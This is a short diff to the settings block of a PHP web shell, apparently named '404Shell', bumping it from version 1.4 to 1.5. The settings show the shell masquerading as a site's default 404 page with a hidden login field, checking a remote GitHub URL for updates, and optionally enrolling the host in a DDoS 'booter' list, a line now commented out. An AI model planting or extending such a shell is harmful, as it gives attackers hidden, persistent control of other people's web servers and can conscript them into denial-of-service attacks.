@@ -1,9 +1,9 @@
 <?php
-$pass               = md5("pw");
-$version            = 1.4;
-$adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
-$checkforupdates    = true;
-$helpsupportbooter  = false; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
+$pass               = md5("pw"); // Change password here.
+$version            = 1.5;
+$adaptiveerrorpage  = true; // Get Default 404 page and replicate it, but add a login text field in the center at the bottom
+$checkforupdates    = true; // Default Set to "true" if you do not want to see updates mark "false"
+//$helpsupportbooter  = false; // Get added to DDOS Script List "404Shell by Kyle Boyer"
 $checkforupdatesurl = "https://raw.githubusercontent.com/codelyfe/Responsive-404Shell/master/404sx.php";
 $mtime     = explode(' ', microtime());
 $starttime = $mtime[1] + $mtime[0];
